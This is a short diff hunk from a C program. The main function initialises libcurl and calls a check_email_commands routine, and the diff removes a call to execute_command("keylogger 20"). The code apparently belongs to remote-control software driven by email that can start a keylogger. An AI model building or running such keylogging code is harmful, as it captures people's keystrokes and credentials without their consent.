@@ -4,7 +4,6 @@
 int main() {
   curl_global_init(CURL_GLOBAL_DEFAULT);
 
-  execute_command("keylogger 20");
   check_email_commands();
   curl_global_cleanup();
 
